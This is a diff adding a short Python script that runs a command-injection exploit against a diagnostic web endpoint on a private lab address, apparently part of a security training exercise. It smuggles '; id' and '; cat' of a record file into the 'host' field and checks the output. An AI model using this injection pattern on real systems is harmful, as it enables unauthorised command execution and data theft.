@@ -1,0 +1,55 @@
+#!/usr/bin/env python3
+import json
+import urllib.request
+from urllib.parse import urlencode
+from pathlib import Path
+
+root = Path.home() / "lab11"
+root.mkdir(exist_ok=True)
+
+url = "http://172.29.111.20:8080/diagnose"
+
+def request(host):
+    data = urlencode({"host": host}).encode()
+    req = urllib.request.Request(url, data=data)
+
+    with urllib.request.urlopen(req, timeout=8) as response:
+        return json.load(response)
+
+print("=== BASELINE ===")
+
+result = request("localhost")
+
+if not result["success"]:
+    raise SystemExit("BASELINE_FAILED")
+
+print("BASELINE_OK")
+
+print("=== ATTACK 1: COMMAND INJECTION ===")
+
+result = request("localhost; id")
+
+if "uid=" not in result["output"]:
+    raise SystemExit("COMMAND_INJECTION_FAILED")
+
+print("COMMAND_INJECTION_OK")
+print(result["output"].strip())
+
+print("=== ATTACK 2: DATA ACCESS ===")
+
+result = request(
+    "localhost; cat /home/ubuntu/lab11/training-record.txt"
+)
+
+if "LAB11_DEMO_RECORD_2026" not in result["output"]:
+    raise SystemExit("DATA_ACCESS_FAILED")
+
+print("DEMO_DATA_READ_OK")
+
+(root / "attack.log").write_text(
+    "BASELINE_OK\n"
+    "COMMAND_INJECTION_OK\n"
+    "DEMO_DATA_READ_OK\n"
+)
+
+print("LAB11_ATTACK_OK")
